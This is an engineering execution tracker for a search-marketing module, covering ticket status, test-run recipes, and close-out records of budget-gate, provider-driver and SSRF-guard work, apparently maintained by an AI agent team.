# SEO / SEM (`search-marketing`) — Execution Tracker

Companion to [`seo-sem-design.md`](./seo-sem-design.md) (§12 is the authoritative ticket spec) and
[`seo-sem-foundation.md`](./seo-sem-foundation.md) (research + cost model). **This file is the
running state of the build** — update it as tickets land; the design doc does not change.

- Module: `search-marketing` · key `search` · tables `search_*`
- Status vocabulary + versioning: `docs/modules/MODULES.md`. Never write "done"/"built".
- Mobilization: `/army`, discussion-first, **1–2 agent concurrency cap** (agent-army standard).
- ⚡ = contract-touching → **QA gate + architect design-review on the diff**, mandatory.

**Last audited:** 2026-07-30 — the owed ⚡ architect half for **SM-40/42/18 is discharged (§6x —
all three LANDED)**, the SM-08/10/13 gates cleared (**§6y** — P1 fully LANDED, **M2 REACHED**),
and the money path has one open P0-class ticket: **SM-50** (incurred-cost rows, §6x.2 + addendum
§A11) — **must land before OQ-11 funds DataForSEO**. Google surfaces are construction-unblocked
(§6x.3 + §A12, SM-25 decomposed). **§6x.4 is the authoritative dev-completion order**; addendum
is at A1.5 (§A11 incurred cost · §A12 Google).

---

## 0 · State at a glance

| Phase | Tickets | Landed | Remaining |
|---|---|---|---|
| P0 Foundation | SM-01…06 | **all 6 LANDED** (gate cleared 2026-07-28) | — **M1 REACHED** |
| P1 $0 value | SM-07…13, SM-29 | **all 8 LANDED** (final three gates cleared 2026-07-30, §6y) | — **M2 REACHED**: the department demos end-to-end at $0 provider spend |
| P2 Paid data | SM-14…17 | 0 — SM-14/SM-17 IN FLIGHT (§6s/§6n, gates owed) | build unblocked vs SM-33 simulation (§A1); real-data AC → SM-41 (staging) |
| P3 SEM + reports | SM-18…24, SM-30 | **SM-18 LANDED** (⚡ §6r + §6x.1) | 7 |
| P4 Live-ads | SM-25a/b/c, SM-26 | 0 | **construction UNBLOCKED** (§6x.3 + §A12: SM-51 sandbox + local Keycloak); the Google OAuth client gates only SM-41G staging acceptance |
| Money-path P0 | **SM-50** (§6x.2, §A11) | 0 | **highest priority; before OQ-11 funding** — ∥ SM-52 |
| Decision-gated | SM-27 (Umami), SM-28 (Semrush) | — | **do not mobilize** |

**Critical path right now (§6x.4 authoritative):** **SM-50 ∥ SM-52** → owed-gates QA batch
(SM-17 · SM-47 · SM-48 · SM-49-QA-half) → **SM-14 remainder ⚡** → SM-15 ∥ SM-16 →
SM-51 ∥ SM-30 → SM-19 ∥ SM-20 → SM-21 ⚡ → SM-25a ⚡ → SM-25b → SM-25c → SM-26-code ∥ SM-22 →
SM-23 → SM-24. Staging-only: SM-41 · SM-41G · SM-26's real push.

**M1 is reached:** the money path is test-proven and fail-closed at *five* gates — pillar kill
switch → engagement tool-scope → **platform-ceiling availability** → ordered budget stop-loss →
provider capability — and the platform boots keyless with paid capabilities cleanly disabled. The
third of those is new: the gate found the global ceiling failing OPEN and closed it (§4d).

**How to run the search suites.** The local stack already publishes what the suites need — Postgres
on `55433` and Cerbos on `3592` — provided it was brought up with BOTH compose files (the
`docker-compose.local.yml` override is what publishes Cerbos; see the platform-nest note in the root
`CLAUDE.md`). No throwaway Cerbos container is needed in that case. Password is in
`infra/compose/.env`.

⚠️ **Run ONE FILE AT A TIME, resetting the test DB between files.** Handing vitest all six files in
one invocation produces nondeterministic failures that are pure harness artifacts — see **SM-31**
(§6) for the defect and the evidence that it is not a product problem. The trustworthy protocol:

```bash
# per file: terminate leaked sessions, recreate the DB, then run
docker exec -e PGPASSWORD="$PGPW" gaiada-postgres-1 psql -U postgres -Atc \
  "SELECT pg_terminate_backend(pid) FROM pg_stat_activity
     WHERE datname='gaiada_platform_test' AND pid <> pg_backend_pid()"
docker exec -e PGPASSWORD="$PGPW" gaiada-postgres-1 psql -U postgres -Atc "DROP DATABASE IF EXISTS gaiada_platform_test"
docker exec -e PGPASSWORD="$PGPW" gaiada-postgres-1 psql -U postgres -Atc "CREATE DATABASE gaiada_platform_test"
cd platform-nest && \
  DATABASE_URL_TEST="postgres://postgres:$PGPW@localhost:55433/gaiada_platform_test" \
  CERBOS_URL="http://localhost:3592" npx vitest run <ONE test file>
```

Tests `describe.skipIf` themselves into silence without those two env vars — **a green run with no
env set means nothing ran.** Worse, vitest reports a suite whose `beforeAll` threw as *skipped*, so
**always read the file-level line, not just the `Tests` total**: "16 skipped" next to a failed suite
means the setup died, not that the tests were intentionally excluded.

---

## 1 · Ledger

Legend — `LANDED` merged + gate cleared · `IN FLIGHT` code exists, gate not cleared · `TODO` ·
`BLOCKED` (reason) · `GATED` (external decision/dependency).

### P0 — Foundation

| # | State | Evidence / gap |
|---|---|---|
| SM-01 ⚡ | **LANDED** | `migrations/0034_module_search.sql`, `0035_integration_connections_search_providers.sql`, `src/db/module-search-rls.test.ts`. 18 `search_*` tables + no-RLS `search_data_cache` (D-4) + float8[] embedding fallback (OQ-8). QA PASS (45/45, adversarial RLS matrix on 2nd DB) + architect APPROVE-WITH-NOTES. |
| SM-02 ⚡ | **LANDED** | `src/modules/search/{index,search.controller,scope-presets}.ts` + tests. ModuleContract, `api/:t/modules/search`, 18 `search.*` mcpTools, property/engagement/kpi CRUD, `engagements/:id/scope` + presets. Repo suite 512/512 green. |
| SM-03 ⚡ | **LANDED** (verified 2026-07-27 by SM-00) | 7 `cerbos/policies/resource_search_*.yaml` + derived-roles wiring + `platform-ui/src/lib/rbac.ts` mirror (`search_staff`/`search_manager`). `search-cerbos.test.ts` **25/25 green against live Cerbos** — full AC matrix: owner/manager/member/served-dept, `launch`/`apply_manual`/`apply_negatives`/`set_budget` denied to staff *and* served-dept staff, `approve`/`deliver` + `set_scope` (D-11) + ledger `admin` denied to member, cross-tenant grants denied, low-assurance gets nothing. |
| SM-04 ⚡ | **LANDED** (gate cleared 2026-07-28, §4d — one fail-open found + fixed; allowlist RATIFIED) | `providers/{types,registry,dispatch,cache,ledger,mock-provider}.ts` + **`dispatch.test.ts` (35 tests)** + the `GET engagements/:id/cost-projection` endpoint + 3 controller tests. All five AC clauses proven; see §4. **Remaining: QA gate + architect review** (⚡), incl. ratifying the new `lint-withtenants` allowlist entry. Note: *no controller dispatch endpoint by design* — SM-05/14/16 are `dispatchProviderOp`'s callers; the AC asks only for the projection endpoint. |
| SM-05 | **LANDED** (mock-server ACs; gate cleared 2026-07-28) | `providers/dataforseo.ts` + `dataforseo.test.ts` (25 tests, injected `fetchImpl`, no network/creds/deposit). All five capabilities parse; Standard-queue `task_post`→`task_get` with the 40602 poll; rate table asserted against the §8a published figures; Live flag exists and defaults Standard. **Real-data AC still GATED on OQ-2** ($50 deposit) — see §5. |
| SM-06 | **LANDED** (gate cleared 2026-07-28) | `config.search.{dataforseo,pillars}`, keyless bootstrap registration in `main.ts`, per-pillar kill switches enforced at dispatch gate (-1), `platform-nest/.env.example` + `infra/compose/.env.example` + `docker-compose.vps.yml` rows. Keyless boot = paid capabilities cleanly disabled, $0 pillars unaffected. |

### P1 — $0 value (crawlers + AI on own data)

| # | State | Note |
|---|---|---|
| SM-07 | **LANDED** (⚡ gate cleared 2026-07-29, §4g — QA found 2 SSRF-adjacent defects, both fixed) | New standalone Go project **`search-crawl-go/`** (separate project per CLAUDE.md, not a shared package) + a `search-crawl` job service in compose (profile `jobs`, `restart: "no"`). Guard enforced at **`DialContext`** — the only enforcement point: reject IP-literal → reject non-allowlisted host → resolve DNS ourselves → reject denied IP → **dial the literal validated IP, never the hostname again** (closes the resolve-then-connect race). Redirect SSRF is covered by construction, since every hop is a fresh request through the same Transport. Rate limit at `RoundTrip`, not dial, because keep-alive connections would dodge a dial-only cap. JSONL audit on every decision, allow or refuse. Go build/vet/test **verified green by me via `wsl.ps1`** (SAC blocks native Go binaries); **27 test funcs**, incl. every required bypass class. **Verified end-to-end in Docker against the live stack**, including a real DNS-rebind via `--add-host` → refused with `reason:"private_ip"`. **Deferred, stated plainly:** SEONaut+MySQL sidecar, open-seo-crawler, Unlighthouse runners — one honest BFS crawler proves the guard instead, which is what the ticket permits. Ingest is SM-08's. |
| SM-08 | **LANDED** (⚡ QA gate PASS 2026-07-30, §6y) | `search-audit.ts` + `search-audit.test.ts`, migration `0045_search_audit_ingest.sql`, routes `GET/POST audits` · `GET audits/:id/findings` · `PATCH findings/:id`. **Idempotency is enforced in the SCHEMA, not just in code**: `UNIQUE (tenant_id, property_id, kind, report_hash)` over a server-computed sha256 of the report + `ON CONFLICT DO NOTHING`, so a re-run is a genuine no-op (a PLAIN UNIQUE, not a partial index — it behaves this way because Postgres treats NULLs as distinct, so only *ingested* rows dedupe; the migration comment says so, my earlier 'partial' wording was wrong). Verified by me: cross-tenant 404 on both audit and finding ids, hostile/oversized/partial report → 400 never 500 and never a partial write, and triage refuses a caller-supplied `regressed` status (system-derived only). Bonus beyond the AC: a second differing run diffs against the first — resolved issues flip to `fixed`, new ones appear. ⚠️ Its agent stopped before writing a final report, so everything here is my own verification, not its self-report. |
| SM-09 | **LANDED** (⚡ gate cleared 2026-07-29, §4g — APPROVE-WITH-NOTES; SM-32 + CSV-quote defect ticketed) | `clustering.ts` (dual-mode embeddings + deterministic greedy clustering + Hermes intent labels), `keyword-import.ts` (CSV/paste), `providers/gateway-client.ts` (sole AI egress), keyword-set CRUD + `/import` `/embed` `/cluster` on the controller. **No migration needed** — 0034 already had the columns. Search module suite **149/149 verified independently**. Determinism: pure function of input order, every read `ORDER BY keyword, id`, strict `>` tie-break so the earliest cluster wins; tests compare the canonical **partition**, not freshly-minted cluster UUIDs. Dual mode proven by a parity test (same fixture through array shape and a pgvector text-literal round-trip → identical partitions) — the honest proof available with pgvector absent. 1k-keyword AC proven twice: pure-function scale test + full HTTP→DB integration. Gateway-sole-egress asserted (all embed/complete calls resolve to one host; fail-closed `GatewayNotConfiguredError` with zero fetches when unconfigured). **4 decisions flagged for review — see below.** |
| SM-10 | **LANDED** (⚡ QA gate PASS 2026-07-30, §6y) | `ai-drafts.ts` (pure prompt builders + fail-soft parsers), `knowledge-client.ts` (WS8 RAG proxy), migration `0046_search_ai_drafts.sql` (`search_content_briefs` + `ai_summary`/`ai_fix_suggestion` columns); brief draft/polish, `POST audits/:id/ai-triage`, report narrative draft. 20 new tests; **full suite 83 files / 821 tests verified by me**. **Avoided the SM-32 shape deliberately:** at most ONE gateway call per request, never a loop, and structured as short read txn → network I/O **outside any transaction** → short write txn, so no connection is ever held across network I/O. Bounds: 50 findings / 200 keywords / 30 triage / 8 knowledge hits, plus a *separate, smaller* 16-chunk ingest bound because the knowledge service embeds each chunk with its own sequential gateway call — a prompt-context bound would not have covered that. Also fixed a latent drift unprompted: the new AI columns existed in the DB but `listAudits`/`listAuditFindings` did not SELECT them. Refuses (400) to re-draft a report past `status='draft'` — SM-22 owns the approve/deliver path. |
| SM-11 ⚡ | **LANDED** (⚡ gate cleared 2026-07-28 §4e; re-verified with SM-29 in place 2026-07-29 §4j) | Pulled forward out of design order (owner call: the department had no visible surface). `lib/searchMarketing.ts` BFF client + `seo` toolkit (3 craft groups, D-10) + 12 routes. Engagements list + engagement detail render REAL landed data; the 10 unbuilt capabilities render `BackendPending` naming their owning ticket. tsc clean · UI suite **537/537** · `next build` green, all 12 routes registered. See §4e. |
| SM-12 | **LANDED** (⚡ gate cleared 2026-07-29, §4j — QA PASS; one demo-fixture defect found + fixed) | Site Audit + Keywords tabs are now REAL surfaces: `AuditFindingsPanel`, `KeywordWorkbench`, `NewKeywordSetForm`, 5 write actions, 4 shape-guarded fetchers. UI **577/577**, `tsc` clean, `next build` green (both routes compiled), browser-driven end-to-end (triage a finding → fixed → reopen; import → embed → cluster with intent labels). Volume renders **three** distinct states — scope-disabled / not-yet-pulled / value — rather than one ambiguous "—", so an operator can tell "switched off" from "no data". The SM-32 cap error surfaces verbatim (`…exceeding the 1000-keyword cap…`) with no partial write. Two honest absences confirmed against the controller and handled by design, not faked: no `GET .../clusters` route (clusters are derived client-side from the `cluster_id`/`cluster_label`/`intent` columns clustering writes onto keyword rows) and no run-a-crawl trigger (that is SM-07's job container) — so no "Run audit" button was invented. |
| SM-13 | **LANDED** (⚡ QA gate PASS 2026-07-30, §6y — 6 of 9 handlers were untested; now covered) | `modules/search/notifications.ts` + `search-notifications.test.ts` (**5/5 verified by me**). Nine §09 event types mapped to deep-link hrefs — `budget_threshold`, `audit.completed`, `audit.regression`, `rank.dropped`, `budget.overspend`, `report.ready_for_review`, `report.delivered`, `campaign.proposed`, `ai_visibility.changed`. Wiring lives in the module's own notifications layer, not the controller (deliberate — SM-10 was editing the controller concurrently). Tested: duplicate suppression keyed on the OutboxEvent id (re-processing never double-inserts) and cross-tenant isolation (an event carrying tenantId=A with an entityId belonging elsewhere does not leak). ⚠️ Its agent stopped before writing a final report, so this is my verification, not its self-report. |
| SM-29 | **LANDED** (⚡ gate cleared 2026-07-29, §4j — QA PASS) | `ScopeEditor.tsx` + `searchMarketingShared.ts` + `searchMarketingActions.ts`; replaces SM-11's placeholder. UI 559/559, `next build` green, browser-driven. Fixed 3 frontend-first drift bugs en route — see §4i. |

### P2 — Paid data · **build UNBLOCKED vs SM-33 simulation (addendum §A1); real-data AC → SM-41; OQ-2/9/10 are staging prerequisites only**

*(Row edits owed by SM-39 (§6e) — found still unapplied at the wave-3 gate and applied there.
Inherited ACs + build order + concurrency pairs: §6j. SM-46 runs first.)*

| # | State | Note |
|---|---|---|
| SM-14 | **IN FLIGHT — partially discharged (§6s), remainder + ⚡ gate owed** | Live-proven 2026-07-29 (§6s): first real traffic through `dispatchProviderOp`, rank + metrics pulls stamping provider/simulated atomically; callback route wired (`controller:1234`). Still owed: DB-backed integration tests, stamp mutation probes (`DispatchResult.simulated` substitution ⇒ red), `listKeywords` SELECT widening + BFF types/fixtures (§4i), the SM-50 callback interlock (§A11.1.4), ⚡ gate re-verifying SM-46a/b on real rows. senior-be · default. |
| SM-15 | TODO | Deps SM-05, SM-08, **SM-14** (∥ blessing withdrawn, §A9.8). n8n flows batch 1 — mode-blind, zero platform routes, scope-driven cadence (§6j). senior-integrator · default. |
| SM-16 | TODO | Deps SM-05, SM-11, SM-14 (pattern reuse). Backlinks + GEO/AI-visibility; same stamp/badge/filter duties transposed (§6j). medior · default. |
| SM-17 | **IN FLIGHT — AC discharged 2026-07-29 (§6n), QA gate owed (§6x.4 step 2)** | First money-ledger surface landed: binding "cost-to-serve (standard rates)" language, verbatim cash legend, per-row chips from the row's own flag, empty-vs-zero as two code paths, reconciliation caption (§6n). Inherits one SM-50 legend line + status-union widening (§A11.2 #6). medior · default. |

### P3 — SEM + reports

| # | State | Note |
|---|---|---|
| SM-18 | **LANDED** (⚡ gate: QA PASS §6r 2026-07-29 + architect APPROVE §6x.1 2026-07-30) | `sem-plan.ts` (cluster→plan generator, pure), `sem-drafts.ts` (RSA + negative AI drafts, pure), new SEM routes on `search.controller.ts` (campaigns/ad-groups/ads/negatives/change-proposals CRUD + generate-plan + AI-draft endpoints), `search-sem.test.ts`/`sem-plan.test.ts`/`sem-drafts.test.ts` (41 new tests). No migration — all columns already existed (0034/0048). No live side-effects: campaign/ad/negative/change-proposal statuses are restricted at the app layer to their ERP-side draft states; a change proposal can reach `approved`/`dismissed` here but `applied` is refused everywhere (400) — SM-30/21 own it. Keyword-metric provenance (0048 `metrics_provider`/`metrics_simulated`) flows into the generated plan as a per-ad-group `{providers, simulatedCount, realCount, unpulledCount}` block, never blended (§A2). See §6l for the close-out record. |
| SM-30 | TODO | Dep SM-18. Manual-apply/export twin — ships without any OAuth. |
| SM-19 | TODO | Deps SM-18, SM-30, SM-11. Dual-mode picker per action. |
| SM-20 | TODO | Dep SM-18. Signed webhook, idempotent upsert. |
| SM-21 ⚡ | TODO | Deps SM-18, SM-03. **opus·high** — approve-execute-replay; a bypass is unacceptable. |
| SM-22 | TODO | Deps SM-10, SM-17, SM-18. |
| SM-23 | TODO | Docs/registration reconcile. **Partly owed already** — see SM-00. |
| SM-24 | TODO | Dep all. Flips the module toward `DEV-VERIFIED`. |

### P4 — Live-ads automation (committed)

| # | State | Note |
|---|---|---|
| SM-25 ⚡ | **DECOMPOSED → SM-25a/b/c (§6x.3, addendum §A12) — construction UNBLOCKED** | SM-25a OAuth core (senior-be · **opus·medium** ⚡, after SM-51) → SM-25b GSC+GA4 read ingestion (medior · default) → SM-25c Ads read binding (senior-be · default). Dev acceptance vs the SM-51 sandbox + local Keycloak; the Google OAuth client gates only **SM-41G** staging acceptance. |
| SM-26 | **CODE UNBLOCKED after SM-21 + SM-25c** (§6x.3) | Executor builds against SM-51's mutate fixtures through SM-21's one-shot path; the real-account push AC is staging (SM-41G, test account). senior-integrator · default. |

### Decision-gated — do not mobilize

| # | Gate | Default |
|---|---|---|
| SM-27 Umami deploy | OQ-5 | Defer |
| SM-28 Semrush premium driver | **SUPERSEDED 2026-07-29** by the SM-34 HTTP driver (addendum §A5) — a connector path would be a second, unmetered cost meter, fail-open by construction, in the wrong trust zone. **OQ-3 no longer gates anything.** | Deferred permanently; connector stays a human research aid whose output is never ingested |

---

## 2 · New ticket — SM-00 (reconcile)

Not in the design doc; created 2026-07-27 because the build paused mid-flight on 07-24 and the docs
drifted from disk.

**SM-00 · Verify SM-03 + reconcile status docs** — tier `junior` (verification part `qa`), default model.

- Run the search suites (`search-cerbos.test.ts`, `search.test.ts`, `scope-presets.test.ts`,
  `module-search-rls.test.ts`) against the live dev stack + Cerbos; confirm the SM-03 AC matrix
  (owner/manager/member/served-dept incl. `launch`/`approve` denials).
- Then reconcile: `MODULES.md` search-marketing **section header still reads `0.0.0 · PLANNED`**
  while the registry row reads `0.1.0 · IN PROGRESS` — fix the section, keep the registry.
- CHANGELOG: declare SM-03 if it passes; correct the "in progress" line to reflect real SM-04 state.
- **AC:** suites green (or failures listed as tickets); MODULES.md self-consistent; CHANGELOG matches disk.

---

## 3 · Sequenced execution plan

Each step = one `/army` mobilization. Respect the 1–2 concurrency cap; `∥` marks the only pairs the
design blesses as safe to run together.

> **SUPERSEDED for sequencing** — steps 8+ first by §6j's build order, then by **§6x.4
> (2026-07-30), the authoritative dev-completion order**. This table stays as the original plan
> record only.

| Step | Work | Tier · model | Gate |
|---|---|---|---|
| **1** | **SM-00** reconcile + verify SM-03 | junior/qa · default | suites green |
| **2** | **SM-04 close-out** — provider tests (scope-disabled refusal names the toggle · cache hit = cost 0 · N concurrent identical = 1 dispatch · budget breach refuses + emits + records blocked · ledger sums = dispatched costs · true-up posted→completed), wire `dispatchProviderOp` to the controller, add `estimateCostUsd`, assert OTel attrs | senior-be · **opus·medium** | ⚡ QA + architect review |
| **3** | **SM-06** ∥ **SM-05** (mock-server ACs only; real-data AC deferred to the deposit) | junior · default ∥ senior-be · default | keyless boot = 🔵 disabled |
| **4** | **SM-07** ∥ **SM-09** | senior-integrator ∥ medior · default | **QA gate mandatory (SSRF)** on SM-07 |
| **5** | **SM-08** → **SM-10** | medior → senior-be · default | gateway-only asserted in tests |
| **6** | **SM-11** ⚡ | senior-fe · default | QA + architect review |
| **7** | **SM-12** → **SM-13** ∥ **SM-29** | medior → junior ∥ medior · default | scope toggle changes dispatch e2e |
| — | *P1 complete → the department demos end-to-end with zero paid spend.* | | |
| **8** | **SM-17**, then **SM-14/15/16** once OQ-2 clears | medior · default | deposit |
| **9** | **SM-18** → **SM-30** → **SM-19**, **SM-20** | senior-be/fe/integrator · default | |
| **10** | **SM-21** ⚡ | senior-be · **opus·high** | QA + architect review, no-bypass proof |
| **11** | **SM-22** → **SM-23** → **SM-24** | medior/junior · default | e2e green → `DEV-VERIFIED` |
| **12** | **SM-25** ⚡ → **SM-26** | senior-be · **opus·medium** → senior-integrator | OAuth client + sandbox account |

**Milestones**

- **M1 — P0 closed** (steps 1–3): money path is test-proven and fail-closed; no UI yet.
- **M2 — P1 closed** (steps 4–7): a real client engagement produces audits, findings, clusters, AI
  drafts and a working console **at $0 provider spend**. This is the honest first demo.
- **M3 — paid data on** (step 8): rankings/backlinks/GEO live, metered per client.
- **M4 — SEM shipped manual-first** (steps 9–11): full planning loop + Ads-Editor exports + reports;
  module reaches `DEV-VERIFIED`.
- **M5 — live-ads writes** (step 12): API push behind WS4 one-shot approval.

---

## 4 · SM-04 close-out record (2026-07-27)

**Suites:** `src/modules/search` + `src/db/module-search-rls.test.ts` → **98/98 green** on live
Postgres + live Cerbos. `tsc --noEmit` clean. `npm run lint:withtenants` clean.

**AC → proof** (design §12 SM-04):

| AC clause | Where proven |
|---|---|
| scope-disabled refused **naming the toggle** | `dispatch.test.ts` — refusal carries `toggle: "rank"` (the human-actionable tool_scope key, not the op kind), provider never called, cost-0 `failed` ledger row |
| cache hit logs cost 0 | hit returns `costUsd: 0` + `completed` `cache_hit` row; provider `dispatchCount` unchanged; plus a **cross-tenant** hit test — the second client pays $0 for market data the first bought (D-4, the cost model itself) |
| concurrent identical → one dispatch | 8 racers through a 120 ms provider delay → `dispatchCount === 1`, 1 billed row, 7 cost-0 hits, all payloads identical |
| budget breach refuses + emits | engagement **and** tenant tiers; `blocked` threshold event + blocked ledger row; breach is sticky across retries; `warn` at the ratio still dispatches; `override` proceeds but emits an audited override event |
| ledger sums match dispatched costs | scripted sequence (1 dispatch + 2 hits + 1 dispatch + 1 refusal) reconciles to the stop-loss's own `sumMonthToDate`; MTD is per-engagement isolated |

Also covered beyond the AC: true-up advances the **same** posted row (never a second one), double
true-up is a no-op, true-up cannot cross tenants, a provider failure rolls back the whole critical
section (no billed row, no poisoned cache), `bypassCache` for tracked-rank pulls, cache-key
canonicalization, fail-closed provider resolution, and `requested_by`/`correlation_id` attribution.

**Three findings fixed in the close-out:**

1. **Scope refusal could be masked by provider resolution.** The blocked-ledger row resolved the
   would-be-billed provider via `pickProviderKey`, which *throws* when no driver is registered —
   so with keyless dev / SM-06 flags off, a scope-disabled op raised `unknown_provider` instead of
   `ScopeDisabledError`. Now best-effort with a default-key fallback; regression test added.
2. **`lint:withtenants` was failing on `ledger.ts:70`** — SM-04 landed without that gate passing.
   `sumGlobalMonthToDate` needs a cross-tenant array by definition (it *is* the platform ceiling).
   Added a reasoned allowlist entry: companies-table array, single scalar aggregate, read-only, no
   client-private column. Per-tenant fan-out rejected — it runs on every paid dispatch.
   **This entry is pending architect ratification at the ⚡ gate**; if refused, the replacement is a
   `SECURITY DEFINER` aggregate function (senior-db migration), not a fan-out.
3. **Warn-threshold float boundary.** A pull landing on *exactly* 80% of cap does not warn
   (`0.8 * 0.025 === 0.020000000000000004`). Cosmetic, on an advisory signal — the breach compare is
   a plain `>` and stays conservative. Documented in the test so SM-17's 80%/100% surfaces inherit a
   known property, not a surprise.

**Out of scope, logged:** `src/admin/bot-admin.test.ts` "chats: list + thread proxies…" fails
reproducibly (`threadBody.chatId` undefined). Pre-existing, WhatsApp bot admin proxy, unrelated to
search — the full suite was 574 passed / 1 failed / 60 skipped *before* any of this session's work.

---

## 4b · SM-05 + SM-06 close-out record (2026-07-27)

Run together (they were the same edit surface: the driver needs the config, the config exists for the
driver). Search suites **125/125**; `tsc` and `lint:withtenants` clean.

**SM-06 — config plumbing.** `config.search.dataforseo` (login/password/baseUrl/queue/timeout) and
`config.search.pillars`. **Keyless is a first-class mode**, not a degraded one: `main.ts` registers
the driver only when both credential halves are present and logs plainly when it doesn't, so paid
capabilities fail closed at the provider registry while the $0 pillars are untouched — which is
exactly what makes the P1-before-P2 order (M2 before the deposit) real rather than aspirational.
Env documented in three places: `platform-nest/.env.example`, `infra/compose/.env.example`, and the
`platform` service in `docker-compose.vps.yml`.

Added beyond the ticket text: the per-pillar flags needed somewhere to *bite*, so dispatch gained a
**gate (-1)** ahead of the scope gate — `PillarDisabledError`, no ledger row (a disabled pillar means
"this capability does not exist right now", not "this client was refused"). Tested: it outranks an
enabled scope and an ample budget, and the pillars are independent (SEO off still leaves GEO pulling).

**SM-05 — DataForSEO driver.** `providers/dataforseo.ts` behind SM-04's interface; no money logic
duplicated — it only speaks HTTP, normalizes envelopes, and prices ops.

| AC clause | Where proven |
|---|---|
| mock-server tests for all capabilities | 25 tests with an injected `fetchImpl`: SERP post+parse (organic-only positions, AI-overview/PAA/snippet features), the Standard-queue **40602 "task in queue" poll** and its give-up path, keyword metrics in both envelope shapes, backlinks with zero-defaults, AI-visibility citation state |
| cost table matches §8a published rates | `DFS_RATES` asserted constant-by-constant; SERP Standard $0.0006 vs Live $0.002 (3.3x), Keywords Data task+per-kw, Labs task+per-item, backlinks PAYG; plus an order-of-magnitude check against the foundation's ~$5.40/client/mo SEO figure |
| Live-queue flag exists but defaults Standard | Live hits `/live/advanced` only when explicitly flipped; the parser resolves anything that isn't the exact string `live` to `standard`, so **a typo cannot triple the bill** |

Also covered: envelope-level failures (DataForSEO signals errors inside a 200), rejected tasks,
request timeout/abort, HTTP Basic against the single shared deposit pool, and **no response body in
error messages** (it can carry the account identifier).

**Deliberately not done:** the real-data pull. That is the one part of SM-05's acceptance the $50
deposit gates, and everything that would still be broken after the deposit — parsing, polling, error
handling, pricing — is proven now. Postback ingestion is SM-15's flow, not this ticket's.

---

## 4c · Session close (2026-07-27)

**Full-repo regression:** 639 passed / 1 failed / 60 skipped — up from 574/1/60 at session start
(+65 tests), with the same single pre-existing `admin/bot-admin.test.ts` failure and **no new
failures**. `tsc --noEmit` clean, `lint:withtenants` clean.

**Ready for one ⚡ gate covering SM-04 + SM-05 + SM-06** (all three are contract-touching and were
built as one dependency chain). The gate needs:

1. **QA** — re-run the suites per §0's recipe and drive the fail-closed paths adversarially.
2. **Architect review of the diff**, with one item that is a *decision*, not a review:
   **ratify or refuse the `lint-withtenants` allowlist entry** for `ledger.ts:70`
   (`sumGlobalMonthToDate`). If refused → `SECURITY DEFINER` aggregate function via a senior-db
   migration; **not** a per-tenant fan-out (that would put one query per company on the hot money path).

**Then P1 begins** at step 4: SM-07 (crawl workers + egress guard, **QA gate mandatory for SSRF**)
∥ SM-09 (keywords/embeddings/clustering, must pass in **both** vector modes — pgvector is absent).

**Separately ticketable, unrelated to search:** `admin/bot-admin.test.ts` "chats: list + thread
proxies…" is a real reproducible break in the WhatsApp admin proxy (`threadBody.chatId` undefined)
that predates this work.

---

## 4d · ⚡ P0 gate record — SM-04 + SM-05 + SM-06 (2026-07-28) · **CLEARED**

**Verification:** all six search suites re-run against live Postgres + live Cerbos, one file at a
time with the test DB recreated between files (see §0 for why, and SM-31 for the defect that forces
it) → **126/126 green**: `dispatch` 38, `dataforseo` 25, `search` 16, `search-cerbos` 25,
`scope-presets` 7, `module-search-rls` 15. `tsc --noEmit` clean. `lint:withtenants` clean.
126 rather than 125 because the gate added one test — below.

### Finding 1 (fixed) — the global ceiling failed OPEN

The adversarial pass on the fail-closed paths found the platform-wide stop-loss tier silently
disabling itself. `dispatchProviderOp` computed month-to-date spend like this:

```ts
let globalMtd = 0;
try { globalMtd = await sumGlobalMonthToDate(); }
catch (e) { span.addEvent("global_mtd_compute_failed", ...); }   // ← degrade to 0
```

A `$0` month-to-date can never breach a cap, so **any** error in that one aggregate turned the
ceiling into a no-op, leaving nothing but a span event behind. That matters more than "one tier of
three degraded", because of the defaults in `config.search`:

- `globalMonthlyCapUsd` — **$150/mo, always set**
- `tenantMonthlyCapUsd` — **`null` by default**, and `evaluateBudget` *skips* a null-cap tier

So on a default deployment the global tier is the **only** platform-wide ceiling; per-engagement
`provider_budget_usd` budgets still held, but total spend across N engagements was unbounded. The
likeliest trigger was a permission/logic failure in `sumGlobalMonthToDate` — i.e. precisely the
cross-tenant aggregate whose lint allowlist entry was up for ratification at this very gate, the
single most likely line in the feature to be reworked.

**Fixed:** it now fails closed. A `GlobalCeilingUnavailableError` (new typed refusal, mirroring the
pillar/scope gates) refuses the dispatch and records a cost-0 `failed` ledger row named
`<endpoint>.global_ceiling_unavailable`, so a refusal is auditable rather than a silent proceed.
Failing closed costs almost no availability: a genuinely dead database fails the rest of dispatch
(cache read, ledger insert) anyway, so this aggregate throwing *while everything else works* points
at a permission or logic fault, not a transient blip.

**Pinned by** `dispatch.test.ts` → "an uncomputable GLOBAL ceiling fails CLOSED rather than
degrading to $0 month-to-date": forces the aggregate to reject with a permission error, then asserts
the typed refusal, `dispatchCount === 0`, and the cost-0 audit row.

### Decision — `lint:withtenants` allowlist for `ledger.ts` `sumGlobalMonthToDate`: **RATIFIED**

Ratified on its merits: the tenant array comes from the platform's own `companies` table (never
caller input), the query is a single `COALESCE(sum(cost_usd),0)` returning **one scalar**, it is
read-only, touches no client-private column, and still runs under `{ modules: ["search"] }`. A
platform-wide ceiling cannot, by definition, be computed from one tenant, and the per-tenant
fan-out was correctly rejected — it would put one query per company on the hot money path.

The `SECURITY DEFINER` fallback is **also rejected**, for a reason worth recording: it would move the
cross-tenant read *into* the database and out of the linter's sight, trading a reviewed, visible
exception for an invisible one. Ratification is conditional on the read-only/aggregate-only shape;
widening that callback to select rows requires a new gate, not an edit.

### Finding 2 (ticketed as SM-31) — the test harness, not the product

Multi-file runs of these suites fail nondeterministically. Evidence that this is harness-only:

- the migration chain applies cleanly 0001→0044 on a fresh database;
- every suite passes individually (126/126 with a DB reset per file);
- **every** failure is a schema-availability artifact — `relation "users"/"companies"/"projects"/
  "search_engagements" does not exist`, and the 500s those cause — and **not one** is a failed
  assertion about search behaviour;
- the failure point moves between runs (migration 0018 in one, 0020 in the next).

Mechanism: `src/testing/setup.ts` `initTestDb()` runs `DROP SCHEMA public CASCADE` against a test
database **shared by every suite in the run**. A suite that leaks a pool connection — observed
directly as a `platform_app_test … idle in transaction` backend — holds locks that make the next
suite's drop deadlock, leaving `schema_migrations` populated with the tables gone; from there every
later suite dies. One leak amplifier was fixed in passing (`search.test.ts` did `await app.close()`
unguarded in `afterAll`, so a failed `beforeAll` left `app` undefined, threw, and skipped
`teardownTestDb()` entirely — now `app?.close()`).

Two dead ends are recorded so they are not retried: `pg_terminate_backend`-before-drop (actively
